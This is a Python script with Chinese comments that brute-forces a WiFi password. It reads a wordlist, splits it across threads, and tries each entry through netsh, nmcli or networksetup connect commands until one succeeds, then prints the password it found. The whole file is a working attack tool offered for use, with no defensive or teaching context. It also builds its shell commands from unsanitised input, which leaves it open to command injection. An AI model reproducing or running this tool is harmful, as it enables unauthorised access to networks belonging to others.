import subprocess
import threading
import os
import platform
from tqdm import tqdm  # 用于显示进度条

# 全局变量，用于存储正确的密码和通知线程停止
correct_password = None
stop_event = threading.Event()

def try_wifi_password(ssid, password):
    global correct_password
    if stop_event.is_set():
        return False

    # 根据操作系统选择命令
    if platform.system() == "Windows":
        command = f'netsh wlan connect name="{ssid}" ssid="{ssid}" key="{password}"'
    elif platform.system() == "Linux":
        command = f'nmcli device wifi connect "{ssid}" password "{password}"'
    elif platform.system() == "Darwin":  # macOS
        command = f'networksetup -setairportnetwork en0 "{ssid}" "{password}"'
    else:
        print("不支持的操作系统！")
        return False

    # 执行命令
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    # 检查连接是否成功
    if result.returncode == 0:
        correct_password = password
        stop_event.set()  # 通知其他线程停止
        return True
    return False

def worker(ssid, password_file, start, end, progress_bar):
    """线程工作函数，逐行读取文件并尝试密码"""
    with open(password_file, 'r', encoding='utf-8') as file:
        file.seek(start)  # 跳转到起始位置
        current_position = start
        while current_position < end:
            line = file.readline()
            if not line:
                break
            password = line.strip()
            if try_wifi_password(ssid, password):
                break
            progress_bar.update(1)  # 更新进度条
            current_position = file.tell()  # 获取当前文件指针位置

def load_passwords(password_file):
    """获取文件总行数和大小"""
    if not os.path.exists(password_file):
        print(f"错误：文件 {password_file} 不存在！")
        exit(1)
    try:
        # 获取文件总行数
        with open(password_file, 'r', encoding='utf-8') as file:
            total_lines = sum(1 for _ in file)
        # 获取文件总大小
        file_size = os.path.getsize(password_file)
        return total_lines, file_size
    except Exception as e:
        print(f"读取文件时出错: {e}")
        exit(1)

def wifi_2_main():
    global correct_password

    # 用户输入
    ssid = input("请输入WiFi的SSID: ")
    password_file = input("请输入密码文件路径（默认：passwords.txt）: ") or "passwords.txt"
    num_threads = int(input("请输入线程数量（默认：4）: ") or 4)

    # 加载文件信息
    total_lines, file_size = load_passwords(password_file)
    print(f"已加载文件，总行数: {total_lines}，文件大小: {file_size // 1024} KB")

    # 初始化进度条
    progress_bar = tqdm(total=total_lines, desc="尝试密码", unit="密码")

    # 计算每个线程处理的文件范围
    chunk_size = file_size // num_threads
    threads = []

    for i in range(num_threads):
        start = i * chunk_size
        end = file_size if i == num_threads - 1 else start + chunk_size
        thread = threading.Thread(target=worker, args=(ssid, password_file, start, end, progress_bar))
        threads.append(thread)
        thread.start()

    # 等待所有线程完成
    for thread in threads:
        thread.join()

    # 关闭进度条
    progress_bar.close()

    # 输出结果
    if correct_password:
        print(f"\n成功连接！SSID: {ssid}, 密码: {correct_password}")
    else:
        print("\n未找到正确的密码。")